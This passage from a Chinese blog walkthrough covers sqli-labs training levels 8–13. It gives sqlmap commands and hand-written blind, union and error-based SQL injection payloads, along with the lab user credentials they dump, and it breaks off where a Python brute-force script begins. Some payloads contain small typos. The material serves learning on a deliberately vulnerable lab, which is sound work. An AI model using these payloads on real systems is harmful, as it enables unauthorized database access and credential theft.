href="https://blog.csdn.net/shanguicsdn111/article/details/142088764">SQLmap使用教程图文教程（非常详细）从零基础入门到精通，看完这一篇就够了。-CSDN博客</a></p><p><code>-u</code>[url]</p><p><code>-D</code>[数据库]</p><p><code>-T</code>[表]</p><p><code>-C</code>[字段]</p><p><code>--dbs</code>[列出所有数据库]</p><p><code>--tables</code>[列出数据库所有表]</p><p><code>--dump</code>[导出表的数据]</p><p><code>--batch</code>[自动选择默认选项（避免交互式提问）]</p><p>这里使用sqlmap</p><p>python sqlmap.py -u <a href="http://sqli-labs:8080/Less-9/?id=1">http://sqli-labs:8080/Less-9/?id=1</a> –batch</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">python sqlmap.py -u http://sqli-labs:8080/Less-8/id?=1<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022011477.png"></p><p>返回的注入点有布尔盲注和时间盲注</p><p>数据库是Mysql</p><p>接下来爆数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">python sqlmap.py -u http://sqli-labs:8080/Less-8/id?=1 --dbs<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022011729.png"></p><p>查看<code>security</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">python sqlmap.py -u http://sqli-labs:8080/Less-8/?id=1 -D security --tables<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022011341.png"></p><p>查看<code>users</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">python sqlmap.py -u http://sqli-labs:8080/Less-8/?id=1 -T users --dump<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022011299.png"></p><h4 id="Less-9-单引号-时间盲注"><a href="#Less-9-单引号-时间盲注" class="headerlink" title="Less-9-单引号-时间盲注"></a>Less-9-单引号-时间盲注</h4><p>python sqlmap.py -u <a href="http://sqli-labs:8080/Less-9/?id=1">http://sqli-labs:8080/Less-9/?id=1</a> –current-db –batch</p><p>无论id等于多少都显示<code>You are in ....</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id=1<br>?id=1&#x27;<br>?id=1&quot;<br><br></code></pre></td></tr></table></figure><p>这一关用到的是时间盲注</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id=1&#x27; and sleep(3) --+<br></code></pre></td></tr></table></figure><p>当传入上面的语句时，页面延迟了三秒，确定为单引号</p><h5 id="时间盲注步骤："><a href="#时间盲注步骤：" class="headerlink" title="时间盲注步骤："></a>时间盲注步骤：</h5><h6 id="获取数据库名"><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a><strong>获取数据库名</strong></h6><p>1.1 猜解数据库名长度语法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(length(database())=x,sleep(5),1)--+</span><br><span class="hljs-string">/*通过变换 x 的值来确定数据库名的长度，得到数据库名的长度为8。*/</span><br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(leng(database())=8,sleep(5),1)--+</span><br></code></pre></td></tr></table></figure><p>1.2 猜测数据库：<br>语法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(ascii(substr(database(),x,1))=y, sleep(2), 0) --+</span><br></code></pre></td></tr></table></figure><p>测试第一位：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(ascii(substr(database(),1,1))=115, sleep(2), 0) --+</span><br></code></pre></td></tr></table></figure><p>测得第一位是 s</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(ascii(substr(database(),2,1))=101, sleep(5), 1)--+</span><br></code></pre></td></tr></table></figure><p>得到第二位是 e（ascii 码是 101）… 以此类推，知道了数据库名是 <strong>security</strong></p><h6 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a><strong>获取表名</strong></h6><p>2.1 猜解表的数量</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and if((select count(table_name) from information_schema.tables where table_schema=database())=4, sleep(2), 0) --+</span><br></code></pre></td></tr></table></figure><p>若延迟，当前数据库有4张表。</p><p>2.2 猜解表名长度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(lentgh((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6, sleep(2), 0) --+</span><br></code></pre></td></tr></table></figure><p>若延迟，第一张表名长度为6（如<code>emails</code>）。</p><p>2.3 逐字符猜解表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101, sleep(2), 0) --+</span><br></code></pre></td></tr></table></figure><p>判断第一个表的第1个字符是否为<code>e</code>（ASCII码101）。</p><p>猜得第一个数据表的第一位是 e,…依次类推，得到 emails</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=114,sleep(5),1)--+</span><br></code></pre></td></tr></table></figure><p>得到第二个数据表的第一位是 r,…依次类推，得到 referers … </p><p>再以此类推，我们可以得到所有的数据表 emails，referers，uagents，users。</p><p>接下来判断字段名与数据内容，还是和上面一样的套路，判断长度，判断名字</p><h6 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a><strong>获取列名</strong></h6><p>3.1 猜列数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and if((select count(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27;)=3, sleep(2), 0) --+</span><br></code></pre></td></tr></table></figure><p>若延迟，<code>users</code>表有3列。</p><p>3.2 猜列名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27; limit 0,1),1,1))=105,sleep(2),0)--+</span><br></code></pre></td></tr></table></figure><p>判断第一列的第1个字符是否为<code>i</code>（ASCII码105）。</p><p>猜测 users 表的列：</p><p>猜得 users 表的第一个列的第一个字符是 i， 以此类推，得到列名是 id，username，password</p><h6 id="提取数据"><a href="#提取数据" class="headerlink" title="提取数据"></a><strong>提取数据</strong></h6><p>4.1 猜用户名的第一个字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id=1&#x27; and if(ascii(substr((select username from users limit 0,1), 1,1))=68,sleep(5),1)--+<br></code></pre></td></tr></table></figure><p>猜得 username 的第一行的第一位，以此类推，得到 username，password 字段的所有内容。</p><ul><li><code>substr(...,x,y)</code> - 从位置 x 开始截取 y 个字符</li><li><code>ascii()</code> - 获取字符的 ASCII 码值</li><li><code>(select count(table_name) from information_schema.tables where table_schema=database())=4</code><ul><li><code>information_schema.tables</code> - 系统表，包含所有表信息</li><li><code>table_schema=database()</code> - 限制在当前数据库</li><li><code>count(table_name)</code> - 计算表数量</li><li><code>=4</code> - 猜测当前数据库有4个表</li></ul></li></ul><h5 id="总结时间盲注："><a href="#总结时间盲注：" class="headerlink" title="总结时间盲注："></a>总结时间盲注：</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sleep(<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and sleep(1)--+</span><br><span class="hljs-string"></span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">AND</span> IF(LENGTH(database())<span class="hljs-operator">&lt;</span><span class="hljs-number">10</span>,sleep(<span class="hljs-number">1</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br><br>#二分法测试数据库长度<br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; AND IF(LENGTH(database())=8,sleep(1),1)--+</span><br><span class="hljs-string"></span><br><span class="hljs-string">#使用 left() 函数判断数据库名的第一位是否是字符 a，注入之后响应很快说明数据库名第一位不是 a。</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">AND</span> IF(<span class="hljs-keyword">LEFT</span>((<span class="hljs-keyword">SELECT</span> database()), <span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;a&#x27;</span>,sleep(<span class="hljs-number">1</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br><br>#使用穷举法进行测试，得出数据库名的第一个字符为 “s”。<br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; AND IF(LEFT((SELECT database()), 1)=&#x27;</span>s<span class="hljs-string">&#x27;,sleep(1),1)--+</span><br><span class="hljs-string"></span><br><span class="hljs-string">#接下来得出数据库名，再使用同样的方法继续爆破表名、字段名及其剩余信息。</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">AND</span> IF(<span class="hljs-keyword">LEFT</span>((<span class="hljs-keyword">SELECT</span> database()), <span class="hljs-number">8</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span>,sleep(<span class="hljs-number">1</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure><h4 id="Less-10-双引号-时间盲注"><a href="#Less-10-双引号-时间盲注" class="headerlink" title="Less-10-双引号-时间盲注"></a>Less-10-双引号-时间盲注</h4><p>和less-9一样，注入点变为<code>&quot;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs plain">判断是双引号的时间盲注<br>?id=1&quot; and sleep(2) --+<br><br>数据库名长度<br>?id=1&quot; and if(length(database())=8,sleep(5),1)--+<br><br>数据库名猜测<br>第一位（s115）：<br>?id=1&quot; and if(ascii(substr(database(),1,1))=115, sleep(2), 0) --+<br>第二位（e101）：<br>?id=1&quot; and if(ascii(substr(database(),2,1))=101, sleep(2), 0) --+<br>以此类推，得到数据库名security<br><br>security库中表的数量<br>?id=1&quot; and if((select count(table_name) from information_schema.tables where table_schema=database())=4, sleep(2), 0) --+<br><br>security库中第一张表的长度<br>?id=1&quot; and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6, sleep(2), 0) --+<br><br>security库中的表名<br>第一张表第一位字符（e101）：<br>?id=1&quot; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101, sleep(2), 0) --+<br>依此类推，得到所有的数据表emails，referers，uagents，users。<br><br><br>###############问题：users表的列数<br>?id=1&quot; and if((select count(column_name) from information_schema.columns where table_name=&#x27;users&#x27;)=4, sleep(2), 0) --+<br><br>users表的第一列列名（i105）：<br>?id=1&quot; and if(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1,1))=105,sleep(2),0)--+<br>依此类推，得到列名是 id，username，password<br><br>username中用户名的字符（D68):<br>?id=1&quot; and if(ascii(substr((select username from users limit 0,1), 1,1))=68,sleep(5),1)--+<br></code></pre></td></tr></table></figure><h4 id="Less-11-‘-POST-union"><a href="#Less-11-‘-POST-union" class="headerlink" title="Less-11-‘-POST-union"></a>Less-11-‘-POST-union</h4><p>尝试输入admin&#x2F;admin，登录成功了。。。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022012937.png"></p><p>尝试输入admin&#x2F;aaa（密码随便）</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022012805.png"></p><p>输入1’</p><p>出现了报错 <code>You have an error in your SQL syntax; check the manual that corresponds to  your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39; and  password=&#39;&#39; LIMIT 0,1&#39; at line 1</code></p><p>引号不匹配，<code>&#39;1&#39;&#39;</code> 显示单引号没有正确闭合；空密码比较</p><p>输入1’#，可以确定是字符型注入</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022012912.png"></p><h5 id="方法一联合注入"><a href="#方法一联合注入" class="headerlink" title="方法一联合注入"></a>方法一联合注入</h5><p>用 union 注入进行尝试：<br><code>1&#39; union select 1,database() #</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022012780.png"></p><p>显示出数据库：<code>security</code></p><p>也可以判断字段数</p><p>a’ order by 1 – a</p><p>a’ order by 2 – a</p><p>a’ order by 3 – a</p><p>第3个字段排序时开始报错，确定返回结果的字段数为 2。</p><p>获取所有数据库，</p><p>a’ union select 1,(select group_concat(schema_name) from information_schema.schemata)  – a</p><p>获取 security 库的所有表，</p><p>a’ union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;”security”)  – a</p><p> 获取 users 表的所有字段</p><p>a’ union select 1,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;”security” and table_name&#x3D;”users”)  – a</p><p> 获取数据库用户的密码</p><p>a’ union select 1,group_concat(id, ‘:’, username, ‘:’, password) from security.users – a</p><h5 id="方式二：报错注入"><a href="#方式二：报错注入" class="headerlink" title="方式二：报错注入"></a>方式二：报错注入</h5><p>判断是否报错<br>a’</p><p>报错<code>You have an error in your SQL syntax; check the manual that corresponds to  your MySQL server version for the right syntax to use near &#39;&#39;a&#39;&#39; and  password=&#39;&#39; LIMIT 0,1&#39; at line 1</code>适合使用报错注入。</p><p>判断报错条件<br>a’ and updatexml(1,0x7e,3) – a</p><p> 页面正常显示报错信息，确定报错函数可以使用。</p><p>获取所有数据库，</p><p>a’ and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),33,31)),3) – a</p><p>获取 security 库的所有表，</p><p>a’ and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;”security”),1,31)),3) – a</p><p> 获取 users 表的所有字段，</p><p>a’ and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;”security” and table_name&#x3D;”users”),1,31)),3) – a</p><p>获取数据库用户的密码，用户名输入：</p><p>a’ and updatexml(1,concat(0x7e,(select group_concat(user,password) from mysql.user where user &#x3D; ‘mituan’)),3) – a</p><h4 id="Less-12-“"><a href="#Less-12-“" class="headerlink" title="Less-12-“)"></a>Less-12-“)</h4><p>与less-11一样，注入点变为<code>&quot;)</code></p><p>用 union 注入进行尝试：<br><code>1&quot;) union select 1,database() #</code></p><p>显示出数据库：<code>security</code></p><p>也可以判断字段数</p><p>a”) order by 1 – a</p><p>a”) order by 2 – a</p><p>a”) order by 3 – a</p><p>第3个字段排序时开始报错，确定返回结果的字段数为 2。</p><p>获取所有数据库，</p><p>a”) union select 1,(select group_concat(schema_name) from information_schema.schemata)  – a</p><p>获取 security 库的所有表，</p><p>a”) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;”security”)  – a</p><p> 获取 users 表的所有字段</p><p>a”) union select 1,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;”security” and table_name&#x3D;”users”)  – a</p><p> 获取数据库用户的密码</p><p>a”) union select 1,group_concat(id, ‘:’, username, ‘:’, password) from security.users – a</p><h4 id="Less-13-报错注入-布尔盲注"><a href="#Less-13-报错注入-布尔盲注" class="headerlink" title="Less-13-&#39;)-报错注入-布尔盲注"></a>Less-13-<code>&#39;)</code>-报错注入-布尔盲注</h4><p>输入admin’ ， 给出报错</p><p><code>You have an error in your SQL syntax; check the manual that corresponds to  your MySQL server version for the right syntax to use near &#39;&#39;admin&#39;&#39;)  and password=(&#39;&#39;) LIMIT 0,1&#39; at line 1</code></p><p>输入<code>admin&#39;) #</code>或者<code>admin&#39;)-- (--后要有一个空格)</code>， 登录成功，说明存在注入点<code>&#39;)</code></p><p>这一关中没有返回登录信息，只显示登录成功与否，可以用布尔盲注和报错注入，</p><h5 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs sql">#判断报错条件<br><br>a<span class="hljs-string">&#x27;) and updatexml(1,0x7e,3) -- a</span><br><span class="hljs-string"></span><br><span class="hljs-string">##返回：XPATH syntax error: &#x27;</span><span class="hljs-operator">~</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">#脱库</span><br><span class="hljs-string">##尝试查询mysql.user表</span><br><span class="hljs-string">a&#x27;</span>) <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-keyword">user</span>,password) <span class="hljs-keyword">from</span> mysql.user <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;mituan&#x27;</span>)),<span class="hljs-number">3</span>) <span class="hljs-comment">-- a</span><br><br>###返回：<span class="hljs-keyword">Only</span> constant XPATH queries <span class="hljs-keyword">are</span> supported<br><br><br>##改用information_schema查询所有数据库名<br>a<span class="hljs-string">&#x27;) and updatexml(1,concat(0x7e,(select group_concat(schema_name)</span><br><span class="hljs-string">from information_schema.schemata)),3) -- a</span><br><span class="hljs-string"></span><br><span class="hljs-string">###返回：XPATH syntax error: &#x27;</span><span class="hljs-operator">~</span>information_schema,challenges,m<span class="hljs-string">&#x27;由于 updatexml() 只能返回约32个字符，所以只显示了部分数据库名</span><br><span class="hljs-string">##可以分段查询：</span><br><span class="hljs-string">a&#x27;</span>) <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> schema_name <span class="hljs-keyword">from</span> information_schema.schemata limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">3</span>) <span class="hljs-comment">-- a</span><br>###返回：XPATH syntax error: <span class="hljs-string">&#x27;~information_schema&#x27;</span><br>a<span class="hljs-string">&#x27;) and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 1,1)),3) -- a</span><br><span class="hljs-string">###返回：XPATH syntax error: &#x27;</span><span class="hljs-operator">~</span>challenges<span class="hljs-string">&#x27;</span><br><span class="hljs-string">a&#x27;</span>) <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> schema_name <span class="hljs-keyword">from</span> information_schema.schemata limit <span class="hljs-number">5</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">3</span>) <span class="hljs-comment">-- a</span><br>###返回：XPATH syntax error: <span class="hljs-string">&#x27;~security&#x27;</span><br><br>#查询 security 数据库的所有表名<br>a<span class="hljs-string">&#x27;) and updatexml(1,concat(0x7e,(select group_concat(table_name)</span><br><span class="hljs-string">from information_schema.tables</span><br><span class="hljs-string">where table_schema=&quot;security&quot;)),3) -- a</span><br><span class="hljs-string"></span><br><span class="hljs-string">##返回：XPATH syntax error: &#x27;</span><span class="hljs-operator">~</span>emails,referers,uagents,users<span class="hljs-string">&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"># 查询 users 表的所有列名</span><br><span class="hljs-string">a&#x27;</span>) <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(column_name)<br><span class="hljs-keyword">from</span> information_schema.columns<br><span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>&quot;security&quot; <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span>&quot;users&quot;)),<span class="hljs-number">3</span>) <span class="hljs-comment">-- a</span><br><br>##返回：XPATH syntax error: <span class="hljs-string">&#x27;~id,username,password&#x27;</span><br><br><br><br>#查表中内容（分段查询）：<br><br>a<span class="hljs-string">&#x27;) and updatexml(1,concat(0x7e,(select concat(id,&#x27;</span>:<span class="hljs-string">&#x27;,username,&#x27;</span>:<span class="hljs-string">&#x27;,password) from security.users limit 0,1)),3) -- a</span><br><span class="hljs-string"></span><br><span class="hljs-string">##返回：XPATH syntax error: &#x27;</span><span class="hljs-operator">~</span><span class="hljs-number">1</span>:Dumb:Dumb<span class="hljs-string">&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">a&#x27;</span>) <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> concat(id,<span class="hljs-string">&#x27;:&#x27;</span>,username,<span class="hljs-string">&#x27;:&#x27;</span>,password) <span class="hljs-keyword">from</span> security.users limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">3</span>) <span class="hljs-comment">-- a</span><br><br>##返回：XPATH syntax error: <span class="hljs-string">&#x27;~2:Angelina:I-kill-you&#x27;</span><br><br><br></code></pre></td></tr></table></figure><p>常见的脱库语句 ：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sql"># 获取所有数据库<br><span class="hljs-keyword">select</span> group_concat(schema_name)<br><span class="hljs-keyword">from</span> information_schema.schemata<br> <br># 获取 security 库的所有表<br><span class="hljs-keyword">select</span> group_concat(table_name)<br><span class="hljs-keyword">from</span> information_schema.tables<br><span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>&quot;security&quot;<br> <br># 获取 users 表的所有字段<br><span class="hljs-keyword">select</span> group_concat(column_name)<br><span class="hljs-keyword">from</span> information_schema.columns<br><span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>&quot;security&quot; <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span>&quot;users&quot;<br></code></pre></td></tr></table></figure><ul><li><code>updatexml(1,0x7e,3)</code> 是一个MySQL XML处理函数，但可以用于报错注入。参数1：XML文档（这里随意填 <code>1</code>）。参数2：XPath表达式（<code>0x7e</code> 是 <code>~</code> 的十六进制，用于触发报错）。参数3：替换值（这里随意填 <code>3</code>）。</li><li><code>concat(0x7e, (...))</code>：<ul><li><code>concat()</code> 用于拼接字符串，<code>0x7e</code>（<code>~</code>）用于触发报错回显。</li></ul></li><li><code>select group_concat(user,password) from mysql.user where user = &#39;mituan&#39;</code>：<ul><li>尝试查询 <code>mysql.user</code> 表（MySQL系统用户表），但 <code>updatexml()</code> 不允许直接查询非常量数据。改用 <code>information_schema</code> （MySQL的系统数据库）查询数据库结构，而不是直接查 <code>mysql.user</code>。</li></ul></li><li>查数据库名 → <code>information_schema.schemata</code></li><li>查表名 → <code>information_schema.tables</code></li><li>查列名 → <code>information_schema.columns</code></li><li>查数据 → <code>select concat(id,username,password) from users</code></li></ul><h5 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h5><p>判断长度：</p><p>判断当前使用数据库名字的长度是否大于1，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">a&#x27;) or length((database()))&gt;1 -- a<br></code></pre></td></tr></table></figure><p>1. </p><p>枚举字符：a”) or ascii(substr((database()),1,1))&gt;1 – a<br>截取当前使用数据库名字的第一个字符，为了方便脚本的编写，这里将字符转换为ASCLL再判断。</p><p>判断第一个字符的ASCLL码是否大于1，用户名输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">a&#x27;) or ascii(substr((database()),1,1))&gt;1 -- a<br></code></pre></td></tr></table></figure><p>接下来使用穷举法，枚举该字符的所有可能性（对应的ASCLL码为：32~126）。</p><p>猜中第一个字符以后，再用此方法枚举其余字符</p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 